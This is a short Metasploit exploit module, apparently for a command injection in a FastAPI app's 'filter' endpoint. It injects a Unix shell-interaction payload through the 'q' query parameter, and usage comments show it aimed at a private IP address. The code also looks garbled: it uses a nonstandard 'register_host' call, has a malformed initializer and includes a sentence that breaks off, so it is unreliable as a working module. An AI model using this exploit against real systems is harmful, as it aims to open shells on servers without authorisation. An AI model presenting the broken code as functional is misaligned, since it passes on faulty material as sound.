module.name: FastAPI Command Injection
module.source_code:
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize
    register_host('RHOSTS', 'RPORT', 'TARGETURI')
    super
  end

  def exploit
    send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri, 'filter'),
      'vars_get' => {
        'q' => payload
      }
    })
  end
end

# Module options
#   RHOSTS - The target address
#   RPORT - The target port
#   TARGETURI - The base path to the vulnerable
  
# Payload
#   cmd/unix/interact - Shell interaction payload
  
# Example:
#   set RHOSTS 192.168.1.50
#   set RPORT 8080
#   set TARGETURI /
#   exploit
